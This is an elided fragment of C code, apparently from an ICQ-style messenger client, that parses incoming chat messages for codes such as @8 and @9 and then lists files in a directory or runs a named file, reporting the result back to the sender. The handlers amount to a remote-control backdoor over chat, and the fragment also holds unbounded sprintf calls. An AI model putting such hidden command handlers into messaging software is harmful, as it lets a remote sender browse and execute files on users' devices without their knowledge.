  ...
  if( strstr(txt,"@13"))
    {
      ...
      CLIST *tt;
      tt=FindContactByUin(strtoul(txt+strlen("@13")+1,0,10));
      ...
      p->pkt.uin=strtoul(txt+strlen("@13")+1,0,10);
      p->pkt.type=2;
   ...
   if( strstr(txt,"@1"))
   {
    ...
    char *msg2;
    if(strstr(txt,"@1"))
      msg2=txt+(strlen("@1")+2+strlen(name)+1);
    ...
    if( strstr(txt,"@8"))
     {
       ...
       *s=0;
       ...
       FindClose(&de,&err);
       mfree(path);
       if(!s) sprintf(s,"dr ( %s ) n f",txt+strlen("@8")+1);
  
       char *ss=malloc(256);
       sprintf(ss,"Recive command < Get files from directory %s >",txt+strlen("@8")+1);
   ...
   {   
     char *ss=malloc(256);
     sprintf(ss,"Recive command < Run file %s >",txt+strlen("@9")+1);
     AddStringToLog(t,0x01,ss,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
     SendData(t,"File was been runned!!",1,0);
     mfree(ss);
     return;
   }   
 }
